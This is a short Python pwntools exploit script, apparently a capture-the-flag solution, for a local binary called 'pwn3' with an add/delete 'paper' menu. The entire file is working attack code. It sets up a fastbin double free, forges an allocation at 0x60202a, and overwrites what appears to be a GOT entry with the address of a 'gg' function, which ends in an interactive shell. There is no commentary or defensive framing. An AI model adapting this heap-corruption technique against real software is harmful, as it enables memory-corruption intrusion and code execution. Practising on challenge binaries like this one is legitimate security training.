from pwn import *
context.log_level = "debug"	
p = process("./pwn3")
elf = ELF("./pwn3")

cmd = lambda c : p.sendlineafter("2 delete paper\n" , str(c))

def add(index , size , content = None):
	cmd(1)
	p.sendlineafter("Input the index you want to store(0-9):" , str(index))
	p.sendlineafter("How long you will enter:" , str(size))
	if content != None:
		p.sendlineafter("please enter your content:" , content)

def delete(index):
	cmd(2)
	p.sendlineafter("which paper you want to delete,please enter it's index(0-9):" , str(index))

def debug():
	gdb.attach(p)
	pause()
size = 0x30
add(0 , size , "fantasy")
add(1 , size , "fantasy")

delete(0)
delete(1)
delete(0)

add(0 , size , p64(0x60202a))

add(1 , size , "fantasy")
add(2 , size , "fantasy")
add(3 , size , p64(elf.plt["system"] + 6)[2:] + p64(elf.sym['gg'])[:7])

cmd(1)
p.interactive()